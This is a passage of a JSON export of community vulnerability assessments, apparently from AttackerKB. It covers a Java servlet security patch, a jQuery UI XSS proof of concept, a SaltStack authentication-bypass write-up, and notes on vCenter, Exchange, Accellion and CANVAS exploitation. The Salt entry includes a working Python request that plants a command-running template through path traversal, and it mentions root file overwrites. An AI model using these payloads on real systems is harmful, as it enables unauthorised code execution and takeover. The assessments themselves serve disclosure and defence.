objJSON.getString(\"CONFIGPATH\");\r\n       strDbBackupFilePath = objJSON.getString(\"DBBACKUPPATH\");\r\n       strZTPTemplatesPath = objJSON.getString(\"ZTPTEMPLATESPATH\");\r\n       strSSHPort = objJSON.getString(\"SSHPORT\");\r\n       strTFTPPort = objJSON.getString(\"TFTPPORT\");\r\n       strMaxBackupFiles = objJSON.getString(\"MAXBACKUPFILES\");\r\n       strNetworkScanTimeout = objJSON.getString(\"NETWORKSCANTIMEOUT\");\r\n       strUserSessionTimeout = objJSON.getString(\"USERSESSIONTIMEOUT\");\r\n       nUseCustomNaming = objJSON.getInt(\"USECUSTOMNAMING\");\r\n       bDataOk = true;\r\n-      boolean sqlInj = false;\r\n+      boolean sqlInj1 = false, filepathDir1 = true;\r\n+      boolean sqlInj2 = false, filepathDir2 = true;\r\n+      boolean sqlInj3 = false, filepathDir3 = true;\r\n+      boolean sqlInj4 = false, filepathDir4 = true;\r\n+      boolean sqlInj5 = false, filepathDir5 = true;\r\n+      boolean sqlInj6 = false, filepathDir6 = true;\r\n       CUtils cutil = new CUtils();\r\n-      if (strPROMFilePath != null && !strPROMFilePath.equals(\"\"))\r\n-        sqlInj = cutil.checkSQLInjection(strPROMFilePath);\r\n-      if (sqlInj)\r\n+      if (strPROMFilePath != null && !strPROMFilePath.equals(\"\")) {\r\n+        sqlInj1 = cutil.checkSQLInjection(strPROMFilePath);\r\n+        filepathDir1 = cutil.checkDirectory(strPROMFilePath);\r\n+      }\r\n+      if (strExportFilePath != null && !strExportFilePath.equals(\"\")) {\r\n+        sqlInj2 = cutil.checkSQLInjection(strExportFilePath);\r\n+        filepathDir2 = cutil.checkDirectory(strExportFilePath);\r\n+      }\r\n+      if (strImportFilePath != null && !strImportFilePath.equals(\"\")) {\r\n+        sqlInj3 = cutil.checkSQLInjection(strImportFilePath);\r\n+        filepathDir3 = cutil.checkDirectory(strImportFilePath);\r\n+      }\r\n+      if (strConfigFilePath != null && !strConfigFilePath.equals(\"\")) {\r\n+        sqlInj4 = cutil.checkSQLInjection(strConfigFilePath);\r\n+        filepathDir4 = cutil.checkDirectory(strConfigFilePath);\r\n+      }\r\n+      if (strDbBackupFilePath != null && !strDbBackupFilePath.equals(\"\")) {\r\n+        sqlInj5 = cutil.checkSQLInjection(strDbBackupFilePath);\r\n+        filepathDir5 = cutil.checkDirectory(strDbBackupFilePath);\r\n+      }\r\n+      if (strZTPTemplatesPath != null && !strZTPTemplatesPath.equals(\"\")) {\r\n+        sqlInj6 = cutil.checkSQLInjection(strZTPTemplatesPath);\r\n+        filepathDir6 = cutil.checkDirectory(strZTPTemplatesPath);\r\n+      }\r\n+      if (sqlInj1 || sqlInj2 || sqlInj3 || sqlInj4 || sqlInj5 || sqlInj6)\r\n+        bDataOk = false;\r\n+      if (!filepathDir1 || !filepathDir2 || !filepathDir3 || !filepathDir4 ||\r\n+        !filepathDir5 || !filepathDir6) {\r\n+        bSecVuln = true;\r\n         bDataOk = false;\r\n+      }\r\n     } catch (Exception exception) {}\r\n     if (bDataOk) {\r\n       if (nUseCustomNaming == 1)\r\n         bDataOk = tempDeviceTreeTable.saveNamingData(strJSONNamingObj);\r\n       if (bDataOk) {\r\n         if (tempSystemTable.updateSystemSettings(strJSONObj)) {\r\n           strResults.append(\"[{\\\"PROMPATH\\\":\\\"\");\r\n           strResults.append(addBackslash(strPROMFilePath));\r\n           strResults.append(\"\\\",\\\"EXPORTPATH\\\":\\\"\");\r\n           strResults.append(addBackslash(strExportFilePath));\r\n           strResults.append(\"\\\",\\\"IMPORTPATH\\\":\\\"\");\r\n           strResults.append(addBackslash(strImportFilePath));\r\n           strResults.append(\"\\\",\\\"CONFIGPATH\\\":\\\"\");\r\n           strResults.append(addBackslash(strConfigFilePath));\r\n           strResults.append(\"\\\",\\\"DBBACKUPPATH\\\":\\\"\");\r\n           strResults.append(addBackslash(strDbBackupFilePath));\r\n           strResults.append(\"\\\",\\\"ZTPTEMPLATESPATH\\\":\\\"\");\r\n           strResults.append(addBackslash(strZTPTemplatesPath));\r\n           strResults.append(\"\\\",\\\"SSHPORT\\\":\\\"\");\r\n           strResults.append(addBackslash(strSSHPort));\r\n           strResults.append(\"\\\",\\\"TFTPPORT\\\":\\\"\");\r\n           strResults.append(addBackslash(strTFTPPort));\r\n           strResults.append(\"\\\",\\\"MAXBACKUPFILES\\\":\\\"\");\r\n           strResults.append(addBackslash(strMaxBackupFiles));\r\n           strResults.append(\"\\\",\\\"NETWORKSCANTIMEOUT\\\":\\\"\");\r\n           strResults.append(addBackslash(strNetworkScanTimeout));\r\n           strResults.append(\"\\\",\\\"USERSESSIONTIMEOUT\\\":\\\"\");\r\n           strResults.append(addBackslash(strUserSessionTimeout));\r\n           strResults.append(\"\\\",\\\"USECUSTOMNAMING\\\":\\\"\");\r\n           strResults.append(Integer.toString(nUseCustomNaming));\r\n           if (nUseCustomNaming == 1) {\r\n             if (tempDeviceTreeTable.createCustomNaming()) {\r\n               String strTempNaming = tempDeviceTreeTable.getCustomNaming();\r\n               strResults.append(\"\\\",\\\"CUSTOMNAMETEMPLATE\\\":\\\"\" + strTempNaming + \"\\\"},\");\r\n             } else {\r\n               strResults.append(\"\\\",\\\"CUSTOMNAMETEMPLATE\\\":\\\"\\\"},\");\r\n             }\r\n             if (tempDeviceTreeTable.getNamingData()) {\r\n               strResults.append(String.valueOf(tempDeviceTreeTable.getJSONObject()) + \"]\");\r\n             } else {\r\n               strResults.append(\"{\\\"IVIEW_NAMING\\\":\\\"\\\"}]\");\r\n             }\r\n           } else {\r\n             strResults.append(\"\\\",\\\"CUSTOMNAMETEMPLATE\\\":\\\"\\\"},{\\\"IVIEW_NAMING\\\":\\\"\\\"}]\");\r\n           }\r\n         } else {\r\n           strResults.append(\"Failed to save System Settings data.\");\r\n         }\r\n       } else {\r\n         strResults.append(\"Failed to save custom naming format data.\");\r\n       }\r\n+    } else if (bSecVuln) {\r\n+      strResults.append(\"Failed to updateSystemSettings: File Path Error.\");\r\n     } else {\r\n       strResults.append(\"Failed to parse updateSystemSettings data.\");\r\n     }\r\n     response.setContentType(\"text/html\");\r\n     try {\r\n       PrintWriter out = response.getWriter();\r\n       out.println(strResults.toString());\r\n     } catch (Exception e) {\r\n-      System.out.println(\"NetworkServlet-retrieveSystemSettings: \" + e.toString());\r\n+      System.out.println(\"NetworkServlet-updateSystemSettings: \" + e.toString());\r\n     }\r\n     return bReturn;\r\n   }\r\n```\r\n\r\n```diff\r\n   private boolean exportInventoryTable(HttpServletRequest request, HttpServletResponse response) {\r\n     boolean bReturn = false;\r\n     String strResults = new String();\r\n     String strColumnList = request.getParameter(\"col_list\");\r\n     String strSeperator = request.getParameter(\"sep_type\");\r\n     String strFilename = request.getParameter(\"filename\");\r\n     String strSearchTerm = request.getParameter(\"query\");\r\n     String strSearchCol = request.getParameter(\"qtype\");\r\n     String strSortCol = request.getParameter(\"sortname\");\r\n     String strSortOrder = request.getParameter(\"sortorder\");\r\n     DeviceTreeTable tempDeviceTreeTable = new DeviceTreeTable();\r\n+    HttpSession session = request.getSession();\r\n+    if (session == null || session.getAttribute(\"user_id\") == null || session.getAttribute(\"user_name\") == null || session.getAttribute(\"user_level\") == null) {\r\n+      strResults = \"Failed to export inventory table: User Not Login\";\r\n+      System.out.println(\"Failed to export inventory table: User Not Login\");\r\n+      response.setContentType(\"text/html\");\r\n+      try {\r\n+        PrintWriter out = response.getWriter();\r\n+        out.println(strResults);\r\n+      } catch (Exception e) {\r\n+        System.out.println(\"NetworkServlet-exportInventoryTable: \" + e.toString());\r\n+      }\r\n+      return bReturn;\r\n+    }\r\n     try {\r\n       Thread.sleep(3000L);\r\n     } catch (InterruptedException interruptedException) {}\r\n-    boolean sqlInj1 = false, sqlInj2 = false, dtrl = false;\r\n+    boolean sqlInj0 = false, sqlInj1 = false, sqlInj2 = false, dtrl = false;\r\n     CUtils cutil = new CUtils();\r\n+    if (strColumnList != null && !strColumnList.equals(\"\"))\r\n+      sqlInj0 = cutil.checkSQLInjection(strColumnList);\r\n     if (strSearchTerm != null && !strSearchTerm.equals(\"\"))\r\n       sqlInj1 = cutil.checkSQLInjection(strSearchTerm);\r\n     if (strSearchCol != null && !strSearchCol.equals(\"\"))\r\n       sqlInj2 = cutil.checkSQLInjection(strSearchCol);\r\n     if (strFilename != null && !strFilename.equals(\"\"))\r\n-      dtrl = cutil.checkFileNameIncludePath(strFilename);\r\n-    if (!sqlInj1 && !sqlInj2 && !dtrl) {\r\n+      dtrl = cutil.checkFileNameIncludePath(strFilename, \"csv\");\r\n+    if (!sqlInj0 && !sqlInj1 && !sqlInj2 && !dtrl) {\r\n       if (tempDeviceTreeTable.exportInventoryTable(strColumnList, strSeperator, strFilename, strSearchTerm, strSearchCol, strSortCol, strSortOrder)) {\r\n         strResults = \"Export has completed.\";\r\n       } else {\r\n         strResults = \"Export failed.\";\r\n       }\r\n     } else if (dtrl && !sqlInj1 && !sqlInj2) {\r\n-      strResults = \"Export failed: Directory Traversal Vulnerability\";\r\n+      strResults = \"Export failed: Directory/Path Traversal Vulnerability\";\r\n     } else if (!dtrl && (sqlInj1 || sqlInj2)) {\r\n       strResults = \"Export failed: SQL Injection Vulnerability\";\r\n     } else {\r\n       strResults = \"Export failed: Security Vulnerability\";\r\n     }\r\n     response.setContentType(\"text/html\");\r\n     try {\r\n       PrintWriter out = response.getWriter();\r\n       out.println(strResults);\r\n     } catch (Exception e) {\r\n       System.out.println(\"NetworkServlet.exportInventoryTable: \" + e.toString());\r\n     }\r\n     return bReturn;\r\n   }\r\n```",
      "score": 3,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "f6fa0fba-41f6-4255-b16c-968f6a0dd03e",
      "editorId": "98ba15f2-a3ad-41c7-96f7-f2e1961fcd71",
      "topicId": "8878cc0f-8f42-41cd-b190-6aac449597d7",
      "created": "2021-02-24T20:16:24.697156Z",
      "revisionDate": "2024-03-26T11:36:10.400184Z",
      "document": "PoC:\r\n\r\n<!DOCTYPE html>\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head>\r\n    <title>XSS in closeText option of component ui dialog</title>\r\n\r\n    <script src=\"https://code.jquery.com/jquery-2.1.4.js\"></script>\r\n    <script src=\"https://code.jquery.com/ui/1.11.4/jquery-ui.js\"></script>\r\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"http://code.jquery.com/ui/1.9.1/themes/base/jquery-ui.css\">\r\n\r\n\r\n    <script>\r\n   $(document).ready(function ()\r\n       {\r\n        $('#dialog').dialog({ closeText: '<script>alert(\"XSS\")<\\/script>' });      // This is the attack point where you can inject code \r\n  \r\n\r\n // if the CORS/CSP policy is not configured or setup wrong, try an jQuery vuln using  $.ajax('https://www.msn.com/robots.txt');\r\n // if it says onready:1  expand it you should see msn.com's robots file\r\n//  this is a doublewammy of vulnerability in the target\r\n       }\r\n                    );\r\n    </script>\r\n</head>\r\n<body>\r\n    <div id=\"dialog\" title=\"Dialog Title\">Content here!</div>\r\n</body>\r\n</html>\r\n\r\nPositives: Easy, can potentially execute scripts off remote sites\r\nNegatives:  Would likely require user intervention social engineer or phishing to make this persistant or of real use\r\n\r\n\r\nDocument on how the dialog function is used in jQuery - https://www.tutorialspoint.com/jqueryui/jqueryui_dialog.htm\r\n\r\nHere is a link to a site that will prove which jquery exploits are vuln. to which version (specific to jQuery not UI) - https://research.insecurelabs.org/jquery/test/\r\nMore info on exploit and poc: https://vuldb.com/?id.98137\r\n\r\n\r\ndj substance\r\nhttps://tranceattic.com\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Discovery",
        "attacker-value": 2,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "3714edc7-6202-4321-9cd8-bbe49e657ad3",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "b3e0b6d7-814d-4db3-ba2b-8c2f79b7be7b",
      "created": "2021-02-24T22:11:48.289527Z",
      "revisionDate": "2021-02-25T22:27:07.343324Z",
      "document": "Please see the [Rapid7 analysis](https://attackerkb.com/topics/lrfxAJ9nhV/vmware-vsphere-client-unauth-remote-code-execution-vulnerability-cve-2021-21972#rapid7-analysis).",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "6e53db61-b054-492a-9ba2-20cc106b8c42",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "b3e0b6d7-814d-4db3-ba2b-8c2f79b7be7b",
      "created": "2021-02-24T23:19:40.389339Z",
      "revisionDate": "2021-03-03T13:42:58.846566Z",
      "document": "Update March 3: Exploitation in the wild was confirmed over the weekend. See the [Rapid7 analysis](https://attackerkb.com/topics/lrfxAJ9nhV/vmware-vsphere-client-unauth-remote-code-execution-vulnerability-cve-2021-21972?referrer=assessment#rapid7-analysis) for more updates.\r\n\r\nThere are [reports of opportunistic scanning](https://twitter.com/bad_packets/status/1364661586070102016) for vulnerable vCenter Server endpoints and a bunch of PoC that's made its way to GitHub over the past twelve hours or so. There hasn't been confirmation of in-the-wild exploitation yet, but it's hard to imagine that lasting for very long given the enterprise-grade incentives for attackers. As @wvu-r7 points out in the [Rapid7 analysis](https://attackerkb.com/topics/lrfxAJ9nhV/vmware-vsphere-client-unauth-remote-code-execution-vulnerability-cve-2021-21972#rapid7-analysis), the update available for folks on vulnerable versions of vCenter Server merely adds authentication, addressing the attack chain rather than resolving the root cause of the vulnerability; I'd be a little surprised if we didn't see a follow-on CVE at some point for an authentication bypass.",
      "score": 4,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "ce40bed4-43b1-4123-a67d-31b326d36d82",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "245ca8f9-a32e-455b-b7c9-e1cd95710f9d",
      "created": "2021-02-26T17:08:00.68565Z",
      "revisionDate": "2021-03-04T10:04:07.955277Z",
      "document": "## Vulnerability\r\n\r\nhttps://saltproject.io/security_announcements/active-saltstack-cve-release-2021-feb-25/\r\n\r\nThis vulnerability is an Auth bypass in the SaltStack API, specifically, when making requests to the `wheel_async` client no checks are made to verify the requester is authenticated. \r\n\r\nSalt stack is commonly used to automate CI/CD tasks and control the installation of software and packages across large organisations, which makes this an interesting target for attackers. The API is not started by default and is an optional component that may limit the attack surface for organisations. \r\n\r\n## Exploiting\r\n\r\nThis is fairly trivial to exploit in order to run jobs against the salt master, however, there are some limitation in what actions you can perform. There is no cmd execution function. \r\n\r\na very simple example\r\n\r\n```python\r\nimport requests\r\nresponse = requests.post(\r\n    'https://127.0.0.1:8000/run',\r\n    verify=False,\r\n    json={\r\n        'eauth': 'auto',\r\n        'client': 'wheel_async',\r\n        'fun': 'pillar_roots.write',\r\n        'data': '{{ salt[\"cmd.run\"](\"id > /tmp/whoami\")  }}',\r\n        'path': '../../../../../../srv/salt/pwn.sls',\r\n    },\r\n)\r\nif json := response.json():\r\n    print(f'Got JID: {json[\"return\"][0][\"jid\"]}, the task was queued successfully')\r\n```\r\n\r\nYou can edit the salt master configuration variables which include the ability to set the `auth_mode` and `sharedsecrets` if the API is restarted your changes take effect at which point you gain the ability to execute code against the master. \r\n\r\nYou can pair this with a path traversal vulnerability that was patched at the same time to gain file write into the OS. The default installation on Ubuntu the API runs as root so you can use actions like editing `/etc/passwd` or writing ssh-keys to `/root/.ssh/id_rsa` \r\n\r\nPOC available at https://github.com/Immersive-Labs-Sec/CVE-2021-25281\r\n\r\n## Detection\r\n\r\nThe API typically runs on HTTPS so unless you are inspecting SSL this may be difficult to detect with traditional packet analysis. \r\nAs this is exploiting the `async` functionality every request to the instance will create a salt job. Salt stores the input and output of every job on disk so can be easy to review post compromise activity. \r\n\r\nMore details can be found in this article - https://www.immersivelabs.com/resources/blog/how-to-lock-onto-the-hackers-targeting-saltstack-minions/\r\n\r\n\r\n## Patching\r\n\r\nPatches are available for this both from Salt and most package providers. Hardening your instance to prevent access from untrusted IPs can also reduce the risk. \r\n",
      "score": 5,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "eff22a49-8ba3-4baa-a91b-0733c22f2656",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "ed05d93e-5b20-4b44-bac8-c4cb5b46254a",
      "created": "2021-03-03T13:51:36.742445Z",
      "revisionDate": "2021-03-03T17:07:21.472237Z",
      "document": "This attack is super useful to gain privileged access to an Exchange server.  Given the ubiquity of the target, it's remote nature, the presence of a simple python PoC, and the benefits from gaining privileged access to a mail server, hackers will be reaching for this exploit frequently, even if it does require authentication.\r\nFurther complicating matters is that the requests themselves are through https, so standard deployment for NIDS likely will not catch the attack.  If you've added certificates to your NIDS to decrypt traffic, then it might catch the attack, but that scenario is not particularly common, especially in small to midsize organizations.\r\nPatching is the primary method for mitigating this attack, though the logs left afterward (if they are not destroyed) are straightforward and reviewed in the technical analysis here: https://attackerkb.com/topics/taeSMPFD8J/cve-2021-24085?#rapid7-analysis",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "81f676db-bb8f-4efa-9876-6ed4be98eaea",
      "editorId": "91201a0e-991a-4398-8a76-c19633db1515",
      "topicId": "a377493b-6a40-4bb0-bf25-4e62943a3c0c",
      "created": "2021-03-03T15:34:23.402343Z",
      "revisionDate": "2021-03-03T23:43:29.31435Z",
      "document": "I am submitting this information to AttackerKB based on recent news and activity about a cracked version of CANVAS v7.26 being distributed that can exploit CVE-2017-2015. As this vulnerability has recently passed 3 years since release with only some PoCs published, the recent activity is worth noting. The expectation is that an exploit will be in the wild in the near future.\r\n\r\nThere is a good writeup of the recent activity at [https://therecord.media/first-fully-weaponized-spectre-exploit-discovered-online/](https://therecord.media/first-fully-weaponized-spectre-exploit-discovered-online/)\r\n\r\nVirusTotal hash is live at [https://www.virustotal.com/gui/file/ecc0f2aa29b102bf8d67b7d7173e8698c0341ddfdf9757be17595460fbf1791a/detection](https://www.virustotal.com/gui/file/ecc0f2aa29b102bf8d67b7d7173e8698c0341ddfdf9757be17595460fbf1791a/detection)",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Exfiltration",
        "attacker-value": 3,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        }
      ]
    },
    {
      "id": "a628c061-f1ea-40a3-bf37-ebd6fe580517",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "1ba7dc74-f17d-4c34-9a6c-2f6b39787aa2",
      "created": "2021-03-03T16:10:06.193223Z",
      "revisionDate": "2021-03-04T03:48:42.798555Z",
      "document": "Microsoft [released details](https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/) on an active state-sponsored threat campaign (attributed to HAFNIUM) that is exploiting on-prem Exchange Server installations. Microsoft's observation was that these were limited, targeted attacks, but as of March 3, 2021, ongoing mass exploitation has been confirmed by multiple sources. More in the [Rapid7 analysis](https://attackerkb.com/topics/Sw8H0fbJ9O/multiple-microsoft-exchange-zero-day-vulnerabilities---hafnium-campaign?referrer=assessment#rapid7-analysis) tab. \r\n ",
      "score": 4,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "8520a636-2414-4c47-8d85-725be2222a21",
      "editorId": "b68e9cb9-1bd0-4339-abe7-329618ce2467",
      "topicId": "ff495201-9e29-4561-ae45-888e59e30e1b",
      "created": "2021-03-03T18:11:33.694775Z",
      "revisionDate": "2021-03-15T16:15:51.990418Z",
      "document": "Accellion\u2019s legacy File Transfer Appliance (FTA) is an application to transfer large files securely. It is a 20-year-old product and will reach End of Life on [April 30, 2021](https://www.accellion.com/sites/default/files/resources/fta-eol.pdf). Accellion recommends to [migrate to kiteworks](https://www.accellion.com/products/fta/), its enterprise content firewall platform. According to this [post](https://www.fireeye.com/blog/threat-research/2021/02/accellion-fta-exploited-for-data-theft-and-extortion.html), the SQL injection vulnerability is the starting point of a series of attacks against multiple organizations. This post reports that this vulnerability has been actively exploited since mid-December 2020 and is related to an ongoing ransomware campaign.\r\n\r\nThis SQL injection vulnerability enables an unauthenticated remote attacker to retrieve data from the database by sending specially crafted requests to the `document_root` file. Especifically, it has been exploited to retrieve a key that led to the installation of a web shell on the appliance. This [web shell](https://www.guidepointsecurity.com/accellion-fta-targeted-by-file-downloading-web-shell/) was then used to download sensitive data from the FTA internal database.\r\n\r\nDue to the nature of this application, the data available is likely to be very sensitive and exploiting this vulnerability would lead to a critical information leak. As an emergency mitigation, external access to any vulnerable FTA should be shut down. However, this won't block attacks coming from the internal network. It is highly recommended to patch to the latest version and to consider migrating to kiteworks.\r\n",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "e06c534c-85ca-4a68-b9e5-00956dbf5b14",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "8e9f0dc4-bc72-4340-b70e-5680ca968d2b",
      "created": "2021-03-03T18:59:23.996585Z",
      "revisionDate": "2021-05-17T20:21:06.239958Z",
